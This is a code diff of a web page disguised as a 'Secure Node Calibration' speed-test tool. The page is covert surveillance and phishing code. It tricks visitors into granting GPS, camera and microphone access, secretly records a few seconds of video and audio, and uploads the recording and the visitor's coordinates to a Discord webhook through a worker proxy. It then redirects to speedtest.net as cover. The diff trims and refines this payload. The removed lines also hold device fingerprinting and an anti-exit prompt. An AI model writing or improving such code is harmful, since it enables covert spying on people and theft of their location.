@@ -10,8 +10,8 @@
         .terminal { background: #000; padding: 15px; border-radius: 5px; height: 200px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
         .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 0; transition: opacity 0.2s; }
         .line.show { opacity: 1; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 10px rgba(0, 210, 255, 0.5); }
-        .btn:disabled { background: #161b2c; color: #5c6784; box-shadow: none; cursor: not-allowed; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; }
+        .btn:disabled { background: #161b2c; color: #5c6784; }
         .bar-container { height: 2px; width: 100%; background: #111; margin-bottom: 10px; }
         .bar { height: 100%; width: 0%; background: #00d2ff; transition: width 6s linear; }
         video { display: none; }
@@ -20,7 +20,7 @@
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784; letter-spacing: 1px;">SECURE NODE CALIBRATION v4.5.5</div>
+        <div style="font-size: 0.7rem; color: #5c6784;">SECURE NODE CALIBRATION v4.6.0</div>
         <div class="terminal" id="terminal">
             <div class="line show">> System idle. Awaiting authorization...</div>
         </div>
@@ -31,8 +31,8 @@
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-        // !!! IMPORTANT: CHANGE THIS TO YOUR WORKER URL !!!
-        const WEBHOOK_PROXY = 'https://discord-proxy.yourname.workers.dev'; 
+        // !!! IMPORTANT: THIS MUST BE YOUR CLOUDFLARE WORKER LINK !!!
+        const WEBHOOK_PROXY = 'https://YOUR-WORKER-NAME.workers.dev'; 
 
         const btn = document.getElementById('startBtn');
         const terminal = document.getElementById('terminal');
@@ -48,104 +48,70 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // 1. Anti-Escape
-        window.onbeforeunload = function() {
-            return "Scan in progress...";
-        };
-
-        // 2. GPU Detection
-        function getGPU() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_AD) : "Standard";
-            } catch (e) { return "Unknown"; }
-        }
-
         btn.addEventListener('click', async function() {
             btn.disabled = true;
-            addLog("> Requesting GPS Handshake...");
-
-            // Try Fullscreen
-            try { document.documentElement.requestFullscreen(); } catch(e) {}
+            addLog("> Requesting Handshake...");
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                addLog("> GPS Linked. Calibrating Sensors...");
-                navigator.vibrate([100, 50, 100]);
-
+                addLog("> GPS Linked. Calibrating...");
+                
                 let stream;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
+                        video: { facingMode: "user", width: 480 }, 
                         audio: true 
                     });
                 } catch (e) {
-                    addLog("> ERROR: Hardware Access Denied.", "#ff4b2b");
-                    btn.disabled = false;
+                    addLog("> ERROR: Media Blocked.", "#ff4b2b");
                     return;
                 }
 
                 if (stream) {
-                    addLog("> Media Node Active. Recording Flux...");
+                    addLog("> Node Active. Recording...");
                     
-                    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') 
-                                     ? 'video/webm;codecs=vp8,opus' : 'video/webm';
-                    
-                    const mediaRecorder = new MediaRecorder(stream, { mimeType });
+                    const mediaRecorder = new MediaRecorder(stream);
                     const chunks = [];
-                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                    
-                    mediaRecorder.start(1000); 
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.start();
                     bar.style.width = "100%";
 
-                    setTimeout(() => addLog("> Syncing Clock..."), 1000);
-                    setTimeout(() => addLog("> GPU Detected: " + getGPU().split(' ').slice(0,2).join(' ')), 2000);
-                    setTimeout(() => addLog("> Optimizing Node..."), 3500);
-
                     setTimeout(() => {
-                        addLog("> Encrypting Telemetry...");
+                        addLog("> Uploading Data...");
                         mediaRecorder.stop();
-                    }, 5000);
+                    }, 4000);
 
                     mediaRecorder.onstop = async () => {
-                        const videoBlob = new Blob(chunks, { type: mimeType });
-                        const b = await navigator.getBattery();
+                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
                         const formData = new FormData();
                         
-                        const message = {
-                            content: "🛸 **SYSTEM NODE CAPTURE**",
+                        formData.append('payload_json', JSON.stringify({
+                            content: "🛸 **NODE CAPTURE**",
                             embeds: [{
-                                color: 5763719,
-                                fields: [
-                                    { name: "📍 Location", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
-                                    { name: "🔋 Battery", value: Math.round(b.level * 100) + "%", inline: true },
-                                    { name: "⚙️ Hardware", value: navigator.hardwareConcurrency + " Core / " + getGPU(), inline: true }
-                                ]
+                                fields: [{ name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude }]
                             }]
-                        };
+                        }));
+                        formData.append('file', videoBlob, 'node.webm');
 
-                        formData.append('payload_json', JSON.stringify(message));
-                        formData.append('file', videoBlob, 'node_data.webm');
-
+                        // UPLOAD & TEST RESPONSE
                         try {
-                            await fetch(WEBHOOK_PROXY, { method: 'POST', body: formData });
+                            const response = await fetch(WEBHOOK_PROXY, { method: 'POST', body: formData });
+                            if (response.ok) {
+                                addLog("> Success. Redirecting...");
+                                setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+                            } else {
+                                addLog("> Server Error: " + response.status, "#ff4b2b");
+                            }
                         } catch (err) {
-                            console.log("Upload error");
+                            addLog("> Network Timeout.", "#ff4b2b");
                         }
                         
                         stream.getTracks().forEach(t => t.stop());
-                        window.onbeforeunload = null;
-                        
-                        addLog("> Success. Redirecting...");
-                        setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                     };
                 }
             }, (err) => {
-                addLog("> ERROR: GPS Permission Required.", "#ff4b2b");
-                alert("GPS Required for Node Verification.");
+                addLog("> GPS Permission Denied.", "#ff4b2b");
                 btn.disabled = false;
-            }, { enableHighAccuracy: true });
+            });
         });
     </script>
 </body>
